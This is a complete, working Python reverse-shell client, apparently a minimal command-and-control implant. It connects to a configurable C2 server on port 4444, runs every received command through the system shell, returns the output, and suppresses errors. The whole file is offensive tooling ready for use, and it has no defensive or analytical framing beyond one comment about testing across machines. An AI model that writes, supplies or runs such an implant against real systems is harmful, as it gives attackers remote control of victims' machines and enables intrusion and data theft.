import socket
import subprocess
import os

# Configuration (Change this to your C2 Server's IP address)
C2_SERVER_IP = '127.0.0.1' # Replace with your actual IP if testing across machines
C2_PORT = 4444

def connect_to_c2():
    try:
        # Create a TCP socket and connect to the C2 server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_SERVER_IP, C2_PORT))
        
        while True:
            # Wait to receive a command from the server
            command = s.recv(1024).decode('utf-8')
            
            if command.lower() == 'exit':
                break
                
            # Execute the command using the OS shell
            # stdout=subprocess.PIPE captures the output
            # stderr=subprocess.PIPE captures errors
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            
            # Combine stdout and stderr and send it back to the server
            output = stdout + stderr
            if not output:
                output = b"Command executed successfully (no output)."
                
            s.send(output)
            
    except Exception as e:
        # Fail silently if connection is lost
        pass
    finally:
        s.close()

if __name__ == "__main__":
    connect_to_c2()
